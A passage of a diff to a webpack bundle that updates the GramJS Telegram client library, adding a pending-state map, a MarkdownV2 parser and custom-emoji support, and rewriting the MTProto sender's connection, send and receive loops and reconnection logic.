             size += state.data.length + core_2.TLMessage.SIZE_OVERHEAD;
             if (size <= core_1.MessageContainer.MAXIMUM_SIZE) {
                 let afterId;
+                if (state.after) {
+                    afterId = state.after.msgId;
+                }
                 if (state.after) {
                     afterId = state.after.msgId;
                 }
@@ -51494,16 +51712,48 @@ class MessagePacker {
         data = buffer.getValue();
         return { batch, data };
     }
-    rejectAll() {
-        this._pendingStates.forEach((requestState) => {
-            var _a;
-            requestState.reject(new Error("Disconnect (caused from " +
-                ((_a = requestState === null || requestState === void 0 ? void 0 : requestState.request) === null || _a === void 0 ? void 0 : _a.className) +
-                ")"));
-        });
-    }
 }
 exports.MessagePacker = MessagePacker;
+
+
+/***/ }),
+
+/***/ "./node_modules/telegram/extensions/PendingState.js":
+/*!**********************************************************!*\
+  !*** ./node_modules/telegram/extensions/PendingState.js ***!
+  \**********************************************************/
+/***/ ((__unused_webpack_module, exports) => {
+
+"use strict";
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.PendingState = void 0;
+class PendingState {
+    constructor() {
+        this._pending = new Map();
+    }
+    set(msgId, state) {
+        this._pending.set(msgId.toString(), state);
+    }
+    get(msgId) {
+        return this._pending.get(msgId.toString());
+    }
+    getAndDelete(msgId) {
+        const state = this.get(msgId);
+        this.delete(msgId);
+        return state;
+    }
+    values() {
+        return Array.from(this._pending.values());
+    }
+    delete(msgId) {
+        this._pending.delete(msgId.toString());
+    }
+    clear() {
+        this._pending.clear();
+    }
+}
+exports.PendingState = PendingState;
 
 
 /***/ }),
@@ -51933,6 +52183,10 @@ class HTMLToTelegramParser {
             this._openTagsMeta.shift();
             this._openTagsMeta.unshift(url);
         }
+        else if (name == "tg-emoji") {
+            EntityType = tl_1.Api.MessageEntityCustomEmoji;
+            args["documentId"] = attributes["emoji-id"];
+        }
         if (EntityType && !this._buildingEntities.has(name)) {
             this._buildingEntities.set(name, new EntityType(Object.assign({ offset: this.text.length, length: 0 }, args)));
         }
@@ -52037,7 +52291,7 @@ class HTMLParser {
 </pre>`);
                 }
                 else {
-                    html.push(`<pre></pre><code>${entityText}</code><pre>`);
+                    html.push(`<pre>${entityText}</pre>`);
                 }
             }
             else if (entity instanceof tl_1.Api.MessageEntityEmail) {
@@ -52051,6 +52305,9 @@ class HTMLParser {
             }
             else if (entity instanceof tl_1.Api.MessageEntityMentionName) {
                 html.push(`<a href="tg://user?id=${entity.userId}">${entityText}</a>`);
+            }
+            else if (entity instanceof tl_1.Api.MessageEntityCustomEmoji) {
+                html.push(`<tg-emoji emoji-id="${entity.documentId}">${entityText}</tg-emoji>`);
             }
             else {
                 skipEntity = true;
@@ -52177,6 +52434,67 @@ class MarkdownParser {
     }
 }
 exports.MarkdownParser = MarkdownParser;
+
+
+/***/ }),
+
+/***/ "./node_modules/telegram/extensions/markdownv2.js":
+/*!********************************************************!*\
+  !*** ./node_modules/telegram/extensions/markdownv2.js ***!
+  \********************************************************/
+/***/ ((__unused_webpack_module, exports, __webpack_require__) => {
+
+"use strict";
+
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.MarkdownV2Parser = void 0;
+const html_1 = __webpack_require__(/*! ./html */ "./node_modules/telegram/extensions/html.js");
+class MarkdownV2Parser {
+    static parse(message) {
+        // Bold
+        message = message.replace(/\*(.*?)\*/g, "<b>$1</b>");
+        // underline
+        message = message.replace(/__(.*?)__/g, "<u>$1</u>");
+        // strikethrough
+        message = message.replace(/~(.*?)~/g, "<s>$1</s>");
+        // italic
+        message = message.replace(/-(.*?)-/g, "<i>$1</i>");
+        // pre
+        message = message.replace(/```(.*?)```/g, "<pre>$1</pre>");
+        // code
+        message = message.replace(/`(.*?)`/g, "<code>$1</code>");
+        // Spoiler
+        message = message.replace(/\|\|(.*?)\|\|/g, "<spoiler>$1</spoiler>");
+        // Inline URL
+        message = message.replace(/(?<!\!)\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>');
+        // Emoji
+        message = message.replace(/!\[([^\]]+)\]\(tg:\/\/emoji\?id=(\d+)\)/g, '<tg-emoji emoji-id="$2">$1</tg-emoji>');
+        return html_1.HTMLParser.parse(message);
+    }
+    static unparse(text, entities) {
+        text = html_1.HTMLParser.unparse(text, entities);
+        // Bold
+        text = text.replace(/<b>(.*?)<\/b>/g, "*$1*");
+        // Underline
+        text = text.replace(/<u>(.*?)<\/u>/g, "__$1__");
+        // Code
+        text = text.replace(/<code>(.*?)<\/code>/g, "`$1`");
+        // Pre
+        text = text.replace(/<pre>(.*?)<\/pre>/g, "```$1```");
+        // strikethrough
+        text = text.replace(/<s>(.*?)<\/s>/g, "~$1~");
+        // Italic
+        text = text.replace(/<i>(.*?)<\/i>/g, "-$1-");
+        // Spoiler
+        text = text.replace(/<spoiler>(.*?)<\/spoiler>/g, "||$1||");
+        // Inline URL
+        text = text.replace(/<a href="([^"]+)">([^<]+)<\/a>/g, "[$2]($1)");
+        // Emoji
+        text = text.replace(/<tg-emoji emoji-id="(\d+)">([^<]+)<\/tg-emoji>/g, "![$2](tg://emoji?id=$1)");
+        return text;
+    }
+}
+exports.MarkdownV2Parser = MarkdownV2Parser;
 
 
 /***/ }),
@@ -52634,7 +52952,6 @@ exports.MTProtoSender = void 0;
 const AuthKey_1 = __webpack_require__(/*! ../crypto/AuthKey */ "./node_modules/telegram/crypto/AuthKey.js");
 const MTProtoState_1 = __webpack_require__(/*! ./MTProtoState */ "./node_modules/telegram/network/MTProtoState.js");
 const extensions_1 = __webpack_require__(/*! ../extensions */ "./node_modules/telegram/extensions/index.js");
-const extensions_2 = __webpack_require__(/*! ../extensions */ "./node_modules/telegram/extensions/index.js");
 const core_1 = __webpack_require__(/*! ../tl/core */ "./node_modules/telegram/tl/core/index.js");
 const tl_1 = __webpack_require__(/*! ../tl */ "./node_modules/telegram/tl/index.js");
 const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "./node_modules/big-integer/BigInteger.js"));
@@ -52646,7 +52963,8 @@ const errors_1 = __webpack_require__(/*! ../errors */ "./node_modules/telegram/e
 const _1 = __webpack_require__(/*! ./ */ "./node_modules/telegram/network/index.js");
 const Logger_1 = __webpack_require__(/*! ../extensions/Logger */ "./node_modules/telegram/extensions/Logger.js");
 const async_mutex_1 = __webpack_require__(/*! async-mutex */ "./node_modules/async-mutex/lib/index.js");
-const real_cancellable_promise_1 = __webpack_require__(/*! real-cancellable-promise */ "./node_modules/real-cancellable-promise/dist/index.mjs");
+const PendingState_1 = __webpack_require__(/*! ../extensions/PendingState */ "./node_modules/telegram/extensions/PendingState.js");
+var MsgsAck = tl_1.Api.MsgsAck;
 class MTProtoSender {
     /**
      * @param authKey
@@ -52684,6 +53002,7 @@ class MTProtoSender {
         this.isConnecting = false;
         this._authenticated = false;
         this._userConnected = false;
+        this.isReconnecting = false;
         this._reconnecting = false;
         this._disconnected = true;
         /**
@@ -52700,11 +53019,11 @@ class MTProtoSender {
          * Outgoing messages are put in a queue and sent in a batch.
          * Note that here we're also storing their ``_RequestState``.
          */
-        this._sendQueue = new extensions_2.MessagePacker(this._state, this._log);
+        this._sendQueue = new extensions_1.MessagePacker(this._state, this._log);
         /**
          * Sent states are remembered until a response is received.
          */
-        this._pendingState = new Map();
+        this._pendingState = new PendingState_1.PendingState();
         /**
          * Responses must be acknowledged, and we can also batch these.
          */
@@ -52745,21 +53064,35 @@ class MTProtoSender {
     /**
      * Connects to the specified given connection using the given auth key.
      */
-    async connect(connection) {
-        const release = await this._connectMutex.acquire();
-        try {
-            if (this._userConnected) {
-                this._log.info("User is already connected!");
-                return false;
+    async connect(connection, force) {
+        this.userDisconnected = false;
+        if (this._userConnected && !force) {
+            this._log.info("User is already connected!");
+            return false;
+        }
+        this.isConnecting = true;
+        this._connection = connection;
+        for (let attempt = 0; attempt < this._retries; attempt++) {
+            try {
+                await this._connect();
+                if (this._updateCallback) {
+                    this._updateCallback(this._client, new _1.UpdateConnectionState(_1.UpdateConnectionState.connected));
+                }
+                break;
             }
-            this._connection = connection;
-            await this._connect();
-            this._userConnected = true;
-            return true;
+            catch (err) {
+                if (this._updateCallback && attempt === 0) {
+                    this._updateCallback(this._client, new _1.UpdateConnectionState(_1.UpdateConnectionState.disconnected));
+                }
+                this._log.error(`WebSocket connection failed attempt: ${attempt + 1}`);
+                if (this._log.canSend(Logger_1.LogLevel.ERROR)) {
+                    console.error(err);
+                }
+                await (0, Helpers_1.sleep)(this._delay);
+            }
         }
-        finally {
-            release();
-        }
+        this.isConnecting = false;
+        return true;
     }
     isConnected() {
         return this._userConnected;
@@ -52774,16 +53107,9 @@ class MTProtoSender {
      * all pending requests, and closes the send and receive loops.
      */
     async disconnect() {
-        const release = await this._connectMutex.acquire();
-        try {
-            await this._disconnect();
-        }
-        catch (e) {
-            this._log.error(e);
-        }
-        finally {
-            release();
-        }
+        this.userDisconnected = true;
+        this._log.warn("Disconnecting...");
+        await this._disconnect();
     }
     /**
      *
@@ -52811,12 +53137,13 @@ class MTProtoSender {
      * @returns {RequestState}
      */
     send(request) {
-        if (!this._userConnected) {
-            throw new Error("Cannot send requests while disconnected. You need to call .connect()");
-        }
         const state = new RequestState_1.RequestState(request);
+        this._log.debug(`Send ${request.className}`);
         this._sendQueue.append(state);
         return state.promise;
+    }
+    addStateToQueue(state) {
+        this._sendQueue.append(state);
     }
     /**
      * Performs the actual connection, retrying, generating the
@@ -52826,81 +53153,55 @@ class MTProtoSender {
      * @private
      */
     async _connect() {
-        this._log.info("Connecting to {0} using {1}"
-            .replace("{0}", this._connection.toString())
-            .replace("{1}", this._connection.socket.toString()));
-        let connected = false;
-        for (let attempt = 0; attempt < this._retries; attempt++) {
-            if (!connected) {
-                connected = await this._tryConnect(attempt);
-                if (!connected) {
-                    continue;
-                }
-            }
-            if (!this.authKey.getKey()) {
-                try {
-                    if (!(await this._tryGenAuthKey(attempt))) {
-                        continue;
-                    }
-                }
-                catch (err) {
-                    this._log.warn(`Connection error ${attempt} during auth_key gen`);
-                    if (this._log.canSend(Logger_1.LogLevel.ERROR)) {
-                        console.error(err);
-                    }
-                    await this._connection.disconnect();
-                    connected = false;
-                    await (0, Helpers_1.sleep)(this._delay);
-                    continue;
-                }
-            }
-            else {
-                this._authenticated = true;
-                this._log.debug("Already have an auth key ...");
-            }
-            break;
-        }
-        if (!connected) {
-            throw new Error(`Connection to telegram failed after ${this._retries} time(s)`);
+        const connection = this._connection;
+        if (!connection.isConnected()) {
+            this._log.info("Connecting to {0}...".replace("{0}", connection.toString()));
+            await connection.connect();
+            this._log.debug("Connection success!");
         }
         if (!this.authKey.getKey()) {
-            const error = new Error(`auth key generation failed after ${this._retries} time(s)`);
-            await this._disconnect(error);
-            throw error;
+            const plain = new MTProtoPlainSender_1.MTProtoPlainSender(connection, this._log);
+            this._log.debug("New auth_key attempt ...");
+            const res = await (0, Authenticator_1.doAuthentication)(plain, this._log);
+            this._log.debug("Generated new auth_key successfully");
+            await this.authKey.setKey(res.authKey);
+            this._state.timeOffset = res.timeOffset;
+            if (this._authKeyCallback) {
+                await this._authKeyCallback(this.authKey, this._dcId);
+            }
+        }
+        else {
+            this._authenticated = true;
+            this._log.debug("Already have an auth key ...");
         }
         this._userConnected = true;
-        this._log.debug("Starting receive loop");
-        this._recvLoopHandle = this._recvLoop();
-        this._log.debug("Starting send loop");
-        this._sendLoopHandle = this._sendLoop();
-        this._log.info("Connection to %s complete!".replace("%s", this._connection.toString()));
+        this.isReconnecting = false;
+        if (!this._sendLoopHandle) {
+            this._log.debug("Starting send loop");
+            this._sendLoopHandle = this._sendLoop();
+        }
+        if (!this._recvLoopHandle) {
+            this._log.debug("Starting receive loop");
+            this._recvLoopHandle = this._recvLoop();
+        }
+        // _disconnected only completes after manual disconnection
+        // or errors after which the sender cannot continue such
+        // as failing to reconnect or any unexpected error.
+        this._log.info("Connection to %s complete!".replace("%s", connection.toString()));
     }
-    async _disconnect(error) {
-        if (!this._connection) {
+    async _disconnect() {
+        const connection = this._connection;
+        if (this._updateCallback) {
+            this._updateCallback(this._client, new _1.UpdateConnectionState(_1.UpdateConnectionState.disconnected));
+        }
+        if (connection === undefined) {
             this._log.info("Not disconnecting (already have no connection)");
             return;
         }
-        this._log.info("Disconnecting from %s...".replace("%s", this._connection.toString()));
+        this._log.info("Disconnecting from %s...".replace("%s", connection.toString()));
         this._userConnected = false;
-        try {
-            this._log.debug("Closing current connection...");
-            await this._connection.disconnect();
-        }
-        finally {
-            this._log.debug(`Cancelling ${this._pendingState.size} pending message(s)...`);
-            for (const state of this._pendingState.values()) {
-                if (error && !state.result) {
-                    state.reject(error);
-                }
-                else {
-                    state.reject("disconnected");
-                }
-            }
-            this._pendingState.clear();
-            this._cancelLoops();
-            this._log.info("Disconnecting from %s complete!".replace("%s", this._connection.toString()));
-            this._connection = undefined;
-        }
+        this._log.debug("Closing current connection...");
+        await connection.disconnect();
     }
     _cancelLoops() {
         this._cancelSend = true;
@@ -52914,79 +53215,98 @@ class MTProtoSender {
      * @private
      */
     async _sendLoop() {
-        this._cancelSend = false;
-        while (this._userConnected &&
-            !this._reconnecting &&
-            !this._cancelSend) {
-            if (this._pendingAck.size) {
-                const ack = new RequestState_1.RequestState(new tl_1.Api.MsgsAck({ msgIds: Array(...this._pendingAck) }));
-                this._sendQueue.append(ack);
-                this._lastAcks.push(ack);
-                if (this._lastAcks.length >= 10) {
-                    this._lastAcks.shift();
+        // Retry previous pending requests
+        this._sendQueue.prepend(this._pendingState.values());
+        this._pendingState.clear();
+        while (this._userConnected && !this.isReconnecting) {
+            const appendAcks = () => {
+                if (this._pendingAck.size) {
+                    const ack = new RequestState_1.RequestState(new MsgsAck({ msgIds: Array(...this._pendingAck) }));
+                    this._sendQueue.append(ack);
+                    this._lastAcks.push(ack);
+                    if (this._lastAcks.length >= 10) {
+                        this._lastAcks.shift();
+                    }
+                    this._pendingAck.clear();
                 }
-                this._pendingAck.clear();
-            }
-            this._log.debug("Waiting for messages to send..." + this._reconnecting);
+            };
+            appendAcks();
+            this._log.debug(`Waiting for messages to send... ${this.isReconnecting}`);
             // TODO Wait for the connection send queue to be empty?
             // This means that while it's not empty we can wait for
             // more messages to be added to the send queue.
+            await this._sendQueue.wait();
+            // If we've had new ACKs appended while waiting for messages to send, add them to queue
+            appendAcks();
             const res = await this._sendQueue.get();
+            this._log.debug(`Got ${res === null || res === void 0 ? void 0 : res.batch.length} message(s) to send`);
+            if (this.isReconnecting) {
+                this._log.debug("Reconnecting");
+                this._sendLoopHandle = undefined;
+                return;
+            }
             if (!res) {
                 continue;
             }
             let { data } = res;
             const { batch } = res;
             this._log.debug(`Encrypting ${batch.length} message(s) in ${data.length} bytes for sending`);
+            this._log.debug(`Sending   ${batch.map((m) => m.request.className)}`);
             data = await this._state.encryptMessageData(data);
+            try {
+                await this._connection.send(data);
+            }
+            catch (e) {
+                this._log.debug(`Connection closed while sending data ${e}`);
+                if (this._log.canSend(Logger_1.LogLevel.DEBUG)) {
+                    console.error(e);
+                }
+                this._sendLoopHandle = undefined;
+                return;
+            }
             for (const state of batch) {
                 if (!Array.isArray(state)) {
                     if (state.request.classType === "request") {
-                        this._pendingState.set(state.msgId.toString(), state);
+                        this._pendingState.set(state.msgId, state);
                     }
                 }
                 else {
                     for (const s of state) {
                         if (s.request.classType === "request") {
-                            this._pendingState.set(s.msgId.toString(), s);
+                            this._pendingState.set(s.msgId, s);
                         }
                     }
                 }
             }
-            try {
-                await this._connection.send(data);
-            }
-            catch (e) {
-                this._log.error(e);
-                this._log.info("Connection closed while sending data");
-                this._startReconnecting(e);
-                return;
-            }
             this._log.debug("Encrypted messages put in a queue to be sent");
         }
+        this._sendLoopHandle = undefined;
     }
     async _recvLoop() {
         let body;
         let message;
-        while (this._userConnected && !this._reconnecting) {
+        while (this._userConnected && !this.isReconnecting) {
             this._log.debug("Receiving items from the network...");
             try {
-                this.cancellableRecvLoopPromise = (0, real_cancellable_promise_1.pseudoCancellable)(this._connection.recv());
-                body = await this.cancellableRecvLoopPromise;
+                body = await this._connection.recv();
             }
             catch (e) {
-                if (e instanceof real_cancellable_promise_1.Cancellation) {
-                    return;
+                /** when the server disconnects us we want to reconnect */
+                if (!this.userDisconnected) {
+                    this._log.warn("Connection closed while receiving data");
+                    if (this._log.canSend(Logger_1.LogLevel.WARN)) {
+                        console.error(e);
+                    }
+                    this.reconnect();
                 }
-                this._log.error(e);
-                this._log.warn("Connection closed while receiving data...");
-                this._startReconnecting(e);
+                this._recvLoopHandle = undefined;
                 return;
             }
             try {
                 message = await this._state.decryptMessageData(body);
             }
             catch (e) {
+                this._log.debug(`Error while receiving items from the network ${e}`);
                 if (e instanceof errors_1.TypeNotFoundError) {
                     // Received object which we don't know how to deserialize
                     this._log.info(`Type ${e.invalidConstructorId} not found, remaining data ${e.remaining}`);
@@ -53001,30 +53321,25 @@ class MTProtoSender {
                 else if (e instanceof errors_1.InvalidBufferError) {
                     // 404 means that the server has "forgotten" our auth key and we need to create a new one.
                     if (e.code === 404) {
-                        this._log.warn(`Broken authorization key for dc ${this._dcId}; resetting`);
-                        if (this._updateCallback && this._isMainSender) {
-                            this._updateCallback(this._client, new _1.UpdateConnectionState(_1.UpdateConnectionState.broken));
-                        }
-                        else if (this._onConnectionBreak &&
-                            !this._isMainSender) {
-                            // Deletes the current sender from the object
-                            this._onConnectionBreak(this._dcId);
-                        }
-                        await this._disconnect(e);
+                        this._handleBadAuthKey();
                     }
                     else {
                         // this happens sometimes when telegram is having some internal issues.
                         // reconnecting should be enough usually
                         // since the data we sent and received is probably wrong now.
                         this._log.warn(`Invalid buffer ${e.code} for dc ${this._dcId}`);
-                        this._startReconnecting(e);
+                        this.reconnect();
                     }
+                    this._recvLoopHandle = undefined;
                     return;
                 }
                 else {
                     this._log.error("Unhandled error while receiving data");
-                    this._log.error(e);
-                    this._startReconnecting(e);
+                    if (this._log.canSend(Logger_1.LogLevel.ERROR)) {
+                        console.log(e);
+                    }
+                    this.reconnect();
+                    this._recvLoopHandle = undefined;
                     return;
                 }
             }
@@ -53032,12 +53347,37 @@ class MTProtoSender {
                 await this._processMessage(message);
             }
             catch (e) {
-                this._log.error("Unhandled error while processing data");
-                this._log.error(e);
+                // `RPCError` errors except for 'AUTH_KEY_UNREGISTERED' should be handled by the client
+                if (e instanceof errors_1.RPCError) {
+                    if (e.message === "AUTH_KEY_UNREGISTERED" ||
+                        e.message === "SESSION_REVOKED") {
+                        // 'AUTH_KEY_UNREGISTERED' for the main sender is thrown when unauthorized and should be ignored
+                        this._handleBadAuthKey(true);
+                    }
+                }
+                else {
+                    this._log.error("Unhandled error while receiving data");
+                    if (this._log.canSend(Logger_1.LogLevel.ERROR)) {
+                        console.log(e);
+                    }
+                }
             }
         }
+        this._recvLoopHandle = undefined;
     }
     // Response Handlers
+    _handleBadAuthKey(shouldSkipForMain = false) {
+        if (shouldSkipForMain && this._isMainSender) {
+            return;
+        }
+        this._log.warn(`Broken authorization key for dc ${this._dcId}, resetting...`);
+        if (this._isMainSender && this._updateCallback) {
+            this._updateCallback(this._client, new _1.UpdateConnectionState(_1.UpdateConnectionState.broken));
+        }
+        else if (!this._isMainSender && this._onConnectionBreak) {
+            this._onConnectionBreak(this._dcId);
+        }
+    }
     /**
      * Adds the given message to the list of messages that must be
      * acknowledged and dispatches control to different ``_handle_*``
@@ -53063,22 +53403,21 @@ class MTProtoSender {
      * @private
      */
     _popStates(msgId) {
-        let state = this._pendingState.get(msgId.toString());
+        var _a;
+        const state = this._pendingState.getAndDelete(msgId);
         if (state) {
-            this._pendingState.delete(msgId.toString());
             return [state];
         }
         const toPop = [];
-        for (const state of this._pendingState.values()) {
-            if (state.containerId && state.containerId.equals(msgId)) {
-                toPop.push(state.msgId);
+        for (const pendingState of this._pendingState.values()) {
+            if ((_a = pendingState.containerId) === null || _a === void 0 ? void 0 : _a.equals(msgId)) {
+                toPop.push(pendingState.msgId);
             }
         }
         if (toPop.length) {
             const temp = [];
             for (const x of toPop) {
-                temp.push(this._pendingState.get(x.toString()));
-                this._pendingState.delete(x.toString());
+                temp.push(this._pendingState.getAndDelete(x));
             }
             return temp;
         }
@@ -53098,48 +53437,47 @@ class MTProtoSender {
      * @private
      */
     _handleRPCResult(message) {
-        const RPCResult = message.obj;
-        const state = this._pendingState.get(RPCResult.reqMsgId.toString());
-        if (state) {
-            this._pendingState.delete(RPCResult.reqMsgId.toString());
-        }
-        this._log.debug(`Handling RPC result for message ${RPCResult.reqMsgId}`);
+        var _a;
+        const result = message.obj;
+        const state = this._pendingState.getAndDelete(result.reqMsgId);
+        this._log.debug(`Handling RPC result for message ${result.reqMsgId}`);
         if (!state) {
             // TODO We should not get responses to things we never sent
             // However receiving a File() with empty bytes is "common".
             // See #658, #759 and #958. They seem to happen in a container
             // which contain the real response right after.
             try {
-                const reader = new extensions_1.BinaryReader(RPCResult.body);
+                const reader = new extensions_1.BinaryReader(result.body);
                 if (!(reader.tgReadObject() instanceof tl_1.Api.upload.File)) {
-                    throw new Error("Not an upload.File");
+                    throw new errors_1.TypeNotFoundError(0, Buffer.alloc(0));
                 }
             }
             catch (e) {
-                this._log.error(e);
                 if (e instanceof errors_1.TypeNotFoundError) {
-                    this._log.info(`Received response without parent request: ${RPCResult.body}`);
+                    this._log.info(`Received response without parent request: ${result.body}`);
                     return;
                 }
-                else {
-                    throw e;
-                }
+                throw e;
             }
             return;
         }
-        if (RPCResult.error && state.msgId) {
-            const error = (0, errors_1.RPCMessageToError)(RPCResult.error, state.request);
-            this._sendQueue.append(new RequestState_1.RequestState(new tl_1.Api.MsgsAck({ msgIds: [state.msgId] })));
+        if (result.error) {
+            // eslint-disable-next-line new-cap
+            const error = (0, errors_1.RPCMessageToError)(result.error, state.request);
+            this._sendQueue.append(new RequestState_1.RequestState(new MsgsAck({ msgIds: [state.msgId] })));
             state.reject(error);
+            throw error;
         }
         else {
             try {
-                const reader = new extensions_1.BinaryReader(RPCResult.body);
+                const reader = new extensions_1.BinaryReader(result.body);
                 const read = state.request.readResult(reader);
+                this._log.debug(`Handling RPC result ${(_a = read === null || read === void 0 ? void 0 : read.constructor) === null || _a === void 0 ? void 0 : _a.name}`);
                 state.resolve(read);
             }
-            catch (e) {
-                state.reject(e);
+            catch (err) {
+                state.reject(err);
+                throw err;
             }
         }
     }
@@ -53295,34 +53633,9 @@ class MTProtoSender {
         this._state.salt = message.obj.serverSalt;
     }
     /**
-     * Handles a server acknowledge about our messages. Normally
-     * these can be ignored except in the case of ``auth.logOut``:
-     *
-     *     auth.logOut#5717da40 = Bool;
-     *
-     * Telegram doesn't seem to send its result so we need to confirm
-     * it manually. No other request is known to have this behaviour.
-
-     * Since the ID of sent messages consisting of a container is
-     * never returned (unless on a bad notification), this method
-     * also removes containers messages when any of their inner
-     * messages are acknowledged.
-
-     * @param message
-     * @returns {Promise<void>}
-     * @private
+     * Handles a server acknowledge about our messages. Normally these can be ignored
      */
-    async _handleAck(message) {
-        const ack = message.obj;
-        this._log.debug(`Handling acknowledge for ${ack.msgIds}`);
-        for (const msgId of ack.msgIds) {
-            const state = this._pendingState.get(msgId);
-            if (state && state.request instanceof tl_1.Api.auth.LogOut) {
-                this._pendingState.delete(msgId);
-                state.resolve(true);
-            }
-        }
-    }
+    _handleAck() { }
     /**
      * Handles future salt results, which don't come inside a
      * ``rpc_result`` but are still sent through a request:
@@ -53333,12 +53646,9 @@ class MTProtoSender {
      * @private
      */
     async _handleFutureSalts(message) {
-        // TODO save these salts and automatically adjust to the
-        // correct one whenever the salt in use expires.
         this._log.debug(`Handling future salts for message ${message.msgId}`);
-        const state = this._pendingState.get(message.msgId.toString());
+        const state = this._pendingState.getAndDelete(message.msgId);
         if (state) {
-            this._pendingState.delete(message.msgId.toString());
             state.resolve(message.obj);
         }
     }
@@ -53362,99 +53672,49 @@ class MTProtoSender {
      * @private
      */
     async _handleMsgAll(message) { }
-    async _reconnect(lastError) {
+    reconnect() {
+        if (this._userConnected && !this.isReconnecting) {
+            this.isReconnecting = true;
+            // we want to wait a second between each reconnect try to not flood the server with reconnects
+            // in case of internal server issues.
+            (0, Helpers_1.sleep)(1000).then(() => {
+                this._log.info("Started reconnecting");
+                this._reconnect();
+            });
+        }
+    }
+    async _reconnect() {
         this._log.debug("Closing current connection...");
-        await this._connection.disconnect();
-        this._cancelLoops();
-        this._reconnecting = false;
+        try {
+            this._log.warn("[Reconnect] Closing current connection...");
+            await this._disconnect();
+        }
+        catch (err) {
+            this._log.warn("Error happened while disconnecting");
+            if (this._log.canSend(Logger_1.LogLevel.ERROR)) {
+                console.error(err);
+            }
+        }
+        this._sendQueue.clear();
         this._state.reset();
-        let attempt;
-        let ok = true;
-        for (attempt = 0; attempt < this._retries; attempt++) {
-            try {
-                await this._connect();
-                await (0, Helpers_1.sleep)(1000);
-                this._sendQueue.extend([...this._pendingState.values()]);
-                this._pendingState.clear();
-                if (this._autoReconnectCallback) {
-                    this._autoReconnectCallback();
-                }
-                break;
-            }
-            catch (err) {
-                if (attempt == this._retries - 1) {
-                    ok = false;
-                }
-                if (err instanceof errors_1.InvalidBufferError) {
-                    if (err.code === 404) {
-                        this._log.warn(`Broken authorization key for dc ${this._dcId}; resetting`);
-                        await this.authKey.setKey(undefined);
-                        if (this._authKeyCallback) {
-                            await this._authKeyCallback(undefined);
-                        }
-                        ok = false;
-                        break;
-                    }
-                    else {
-                        // this happens sometimes when telegram is having some internal issues.
-                        // since the data we sent and received is probably wrong now.
-                        this._log.warn(`Invalid buffer ${err.code} for dc ${this._dcId}`);
-                    }
-                }
-                this._log.error(`Unexpected exception reconnecting on attempt ${attempt}`);
-                await (0, Helpers_1.sleep)(this._delay);
-                lastError = err;
-            }
-        }
-        if (!ok) {
-            this._log.error(`Automatic reconnection failed ${attempt} time(s)`);
-            await this._disconnect(lastError ? lastError : undefined);
-        }
-    }
-    async _tryConnect(attempt) {
-        try {
-            this._log.debug(`Connection attempt ${attempt}...`);
-            await this._connection.connect();
-            this._log.debug("Connection success!");
-            return true;
-        }
-        catch (err) {
-            this._log.warn(`Attempt ${attempt} at connecting failed`);
-            if (this._log.canSend(Logger_1.LogLevel.ERROR)) {
-                console.error(err);
-            }
-            await (0, Helpers_1.sleep)(this._delay);
-            return false;
-        }
-    }
-    async _tryGenAuthKey(attempt) {
-        const plain = new MTProtoPlainSender_1.MTProtoPlainSender(this._connection, this._log);
-        try {
-            this._log.debug(`New auth_key attempt ${attempt}...`);
-            this._log.debug("New auth_key attempt ...");
-            const res = await (0, Authenticator_1.doAuthentication)(plain, this._log);
-            this._log.debug("Generated new auth_key successfully");
-            await this.authKey.setKey(res.authKey);
-            this._state.timeOffset = res.timeOffset;
-            if (this._authKeyCallback) {
-                await this._authKeyCallback(this.authKey, this._dcId);
-            }
-            this._log.debug("auth_key generation success!");
-            return true;
-        }
-        catch (err) {
-            this._log.warn(`Attempt ${attempt} at generating auth key failed`);
-            if (this._log.canSend(Logger_1.LogLevel.ERROR)) {
-                console.error(err);
-            }
-            return false;
-        }
-    }
-    _startReconnecting(error) {
-        this._log.info(`Starting reconnect...`);
-        if (this._userConnected && !this._reconnecting) {
-            this._reconnecting = true;
-            this._reconnect(error);
+        const connection = this._connection;
+        // For some reason reusing existing connection caused stuck requests
+        // @ts-ignore
+        const newConnection = new connection.constructor({
+            ip: connection._ip,
+            port: connection._port,
+            dcId: connection._dcId,
+            loggers: connection._log,
+            proxy: connection._proxy,
+            testServers: connection._testServers,
+            socket: this._client.networkSocket,
+        });
+        await this.connect(newConnection, true);
+        this.isReconnecting = false;
+        this._sendQueue.prepend(this._pendingState.values());
+        this._pendingState.clear();
+        if (this._autoReconnectCallback) {
+            await this._autoReconnectCallback();
         }
     }
 }
@@ -53759,20 +54019,37 @@ exports.MTProtoState = MTProtoState;
 /*!*******************************************************!*\
   !*** ./node_modules/telegram/network/RequestState.js ***!
   \*******************************************************/
-/***/ ((__unused_webpack_module, exports) => {
+/***/ (function(__unused_webpack_module, exports, __webpack_require__) {
 
 "use strict";
 
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.RequestState = void 0;
+const Deferred_1 = __importDefault(__webpack_require__(/*! ../extensions/Deferred */ "./node_modules/telegram/extensions/Deferred.js"));
 class RequestState {
-    constructor(request, after = undefined) {
+    constructor(request) {
         this.containerId = undefined;
         this.msgId = undefined;
         this.request = request;
         this.data = request.getBytes();
-        this.after = after;
+        this.after = undefined;
         this.result = undefined;
+        this.finished = new Deferred_1.default();
+        this.resetPromise();
+    }
+    isReady() {
+        if (!this.after) {
+            return true;
+        }
+        return this.after.finished.promise;
+    }
+    resetPromise() {
+        var _a;
+        // Prevent stuck await
+        (_a = this.reject) === null || _a === void 0 ? void 0 : _a.call(this);
         this.promise = new Promise((resolve, reject) => {
             this.resolve = resolve;
             this.reject = reject;
@@ -53795,7 +54072,6 @@ exports.RequestState = RequestState;
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.ObfuscatedConnection = exports.PacketCodec = exports.Connection = void 0;
 const extensions_1 = __webpack_require__(/*! ../../extensions */ "./node_modules/telegram/extensions/index.js");
-const real_cancellable_promise_1 = __webpack_require__(/*! real-cancellable-promise */ "./node_modules/real-cancellable-promise/dist/index.mjs");
 /**
  * The `Connection` class is a wrapper around ``asyncio.open_connection``.
  *
@@ -53835,22 +54111,18 @@ class Connection {
     async connect() {
         await this._connect();
         this._connected = true;
-        this._sendTask = this._sendLoop();
+        if (!this._sendTask) {
+            this._sendTask = this._sendLoop();
+        }
         this._recvTask = this._recvLoop();
     }
-    _cancelLoops() {
-        this.recvCancel.cancel();
-        this.sendCancel.cancel();
